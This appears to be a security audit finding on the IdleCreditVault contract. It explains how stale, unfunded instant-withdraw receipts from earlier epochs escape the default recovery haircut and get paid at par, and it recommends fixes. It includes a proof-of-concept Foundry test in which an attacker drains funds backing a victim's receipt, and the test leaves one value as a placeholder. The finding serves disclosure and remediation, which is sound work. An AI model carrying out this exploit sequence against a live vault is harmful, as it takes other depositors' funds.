### Title
Cross-epoch instant-withdraw receipts escape default recovery basis and are paid at par after `finalizeDefault` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The Kakarot bug is a missing "default value" constraint: a dictionary assumed its first `prev_value` equaled the configured default, but nothing enforced it, so uninitialized reads returned attacker-chosen values. The structural analog in idle-tranches is the instant-withdraw recovery accounting in `IdleCreditVault`: `defaultPendingClaimBasis()` and `_defaultPrefundedInstantReserve()` implicitly assume that whenever `pendingInstantWithdraws != 0`, all unfunded instant receipt basis belongs to the *current* `epochNumber` (`instantWithdrawClaimsByEpoch[epochNumber]`). That invariant is never enforced. `instantWithdrawsRequests[user]` aggregates basis across epochs with no per-user epoch marker (there is no `lastWithdrawRequest` analog for instant receipts), so a stale, unfunded instant receipt from an earlier epoch is excluded from `totalBasis` at finalization yet remains payable at par via `_transferFundedClaim` afterwards.

### Finding Description
`defaultPendingClaimBasis()` returns `pendingWithdraws + instantWithdrawClaimsByEpoch[epochNumber]` (only when `pendingInstantWithdraws != 0`), i.e. only the current epoch's instant basis is added to the recovery denominator in `finalizeDefaultRecovery` (`totalBasis = activeBasis + pendingBasis`, `recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis`) [1](#0-0) [2](#0-1) . However `requestInstantWithdraw` adds the basis to `instantWithdrawClaimsByEpoch[currentEpoch]` at request time and to the aggregate `instantWithdrawsRequests[user]` [3](#0-2) , and nothing migrates or clears that per-epoch basis when later epochs run.

A stale receipt arises naturally: `startEpoch` calls `collectInstantWithdrawFunds(min(pendingInstant, totUnderlyings))` and, when underfunded, leaves `pendingInstantWithdraws > 0` while the epoch proceeds [4](#0-3) . The unfunded user cannot claim (the transfer would fail for lack of strategy balance), so the receipt survives into subsequent epochs under `instantWithdrawClaimsByEpoch[oldEpoch]`, which `defaultPendingClaimBasis` never reads.

After `finalizeDefault`, `claimInstantWithdrawRequest` clears only `defaultRecoveryEpoch` basis via `_claimDefaultedInstantWithdrawRequest`, then pays the entire remaining `instantWithdrawsRequests[user]` at par through `_transferFundedClaim` [5](#0-4) [6](#0-5) . `_transferFundedClaim` only requires `balance - defaultRecoveryReserve >= amount`, so the stale claim is paid from non-reserve strategy cash — i.e. from underlyings funding other users' matured normal withdraw receipts [7](#0-6) . Symmetrically, `_defaultPrefundedInstantReserve` computes `prefundedReserve = instantWithdrawClaimsByEpoch[epochNumber] - pendingInstantWithdraws`, which mis-derives the already-funded portion when `pendingInstantWithdraws` contains basis from multiple epochs [8](#0-7) .

### Impact Explanation
Broken invariant: one receipt one payout, and isolation of the default recovery reserve. A holder of an unfunded instant receipt created in epoch N (basis recorded under epoch N) has it completely excluded from the recovery denominator when epoch M > N defaults and is finalized. The user then claims 100% of that receipt at par, spending underlying that belongs to other claimants (funded normal/instant receipts awaiting `claimWithdrawRequest`), up to the full non-reserve strategy balance. Equivalently, if the stale basis is large relative to non-reserve cash, the reserve guard makes both the stale claim and other funded claims permanently unpayable (freezing of unclaimed yield). Quantified loss: the full stale instant receipt amount (or the frozen funded-receipt balance), net of nothing — the haircut was never applied to it.

### Likelihood Explanation
Requires only unprivileged actions: a KYC-passed lender calls `requestWithdraw` during a buffer when the APR dropped (instant path), the honest manager starts the next epoch with insufficient cash to cover the instant queue (routine underfunding case explicitly handled by `startEpoch`), the user simply does not claim (unfunded claims revert anyway), and a later epoch ends in borrower default with `pendingInstantWithdraws != 0` followed by honest `finalizeDefault`. No privileged actor misbehaves; sequencing relies only on documented partial-prefunding behavior. Main residual uncertainty (not fully verifiable in read-only review): whether some path clears stale `instantWithdrawsRequests`/per-epoch basis on `stopEpoch` or `getInstantWithdrawFunds` — none was found; `pendingInstantWithdraws` is only decremented in `collectInstantWithdrawFunds`, and `instantWithdrawsRequests[user]` is only cleared in `claimInstantWithdrawRequest`.

### Recommendation
Track a per-user last instant-request epoch (like `lastWithdrawRequest`) or fold stale instant basis into `defaultPendingClaimBasis`: include all outstanding instant basis, not only `instantWithdrawClaimsByEpoch[epochNumber]` — e.g. sum over epochs or maintain a `totalInstantClaims` counter alongside `instantWithdrawClaimsByEpoch` and use `totalInstantClaims` when `pendingInstantWithdraws != 0`. Similarly compute `_defaultPrefundedInstantReserve` from aggregate instant claims rather than the current-epoch bucket. Alternatively, force-settle or cancel unfunded instant receipts at `stopEpoch`/`startEpoch` so basis cannot cross an epoch boundary.

```solidity
function testStaleInstantReceiptPaidAtParAfterDefault() external {
    // 1. Attacker (KYC'd lender) deposits and epoch 0 runs and stops with a lower APR
    _depositWithUser(attacker, 100_000 * ONE_SCALE, true);
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

    // 2. APR dropped: attacker's requestWithdraw routes to the instant bucket
    vm.prank(attacker);
    uint256 instantBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // 3. Manager starts epoch 1 with too little cash to fund the instant queue:
    //    collectInstantWithdrawFunds(min(pendingInstant, totUnderlyings)) leaves
    //    pendingInstantWithdraws > 0 and the receipt basis stays under
    //    instantWithdrawClaimsByEpoch[1] ... attacker cannot/does not claim.
    _startEpochAndCheckPrices(1);
    assertGt(creditVault.pendingInstantWithdraws(), 0);
    assertEq(creditVault.instantWithdrawsRequests(attacker), instantBasis);

    // 4. Epoch 1 stops, epoch 2 runs and the borrower defaults.
    //    epochNumber is now > the epoch where the instant basis was recorded.
    _stopEpochAndCheckPrices(1, initialProvidedApr, _expectedFundsEndEpoch());
    _depositWithUser(victim, 100_000 * ONE_SCALE, true);   // victim leaves a funded pending receipt
    _startEpochAndCheckPrices(2);
    _stopEpochAndCheckPrices(2, initialProvidedApr, 0);    // borrower returns nothing -> defaulted
    assertTrue(cdoEpoch.defaulted());

    // 5. Manager finalizes with a partial recovery, e.g. 50%.
    //    defaultPendingClaimBasis() = pendingWithdraws + instantWithdrawClaimsByEpoch[2]
    //    -> attacker's epoch-1 instant basis is NOT in totalBasis (missing constraint),
    //    so recoveryPrice ignores it.
    uint256 recovered = /* 50% of accounted basis */;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // 6. Attacker claims: defaulted-epoch branch clears only epoch-2 basis (zero for him),
    //    then _transferFundedClaim pays his FULL stale basis at par, draining cash that
    //    funded the victim's pending withdraw receipt (or reverting and freezing claims).
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    assertEq(underlying.balanceOf(attacker) - balPre, instantBasis); // paid at par, no haircut

    // 7. Victim's matured claim now fails or is short-changed.
    vm.prank(victim);
    vm.expectRevert(); // or assertLt(paid, expectedFundedClaim)
    cdoEpoch.claimWithdrawRequest();
}
```

Expected result: `instantBasis` is paid without applying `defaultRecoveryPrice`, exceeding the reserve-attributable share and directly consuming funded claim liquidity — a quantified theft equal to the stale receipt amount (or, if non-reserve cash is insufficient, permanent freezing of other claimants' funded receipts).

```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
```

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
```
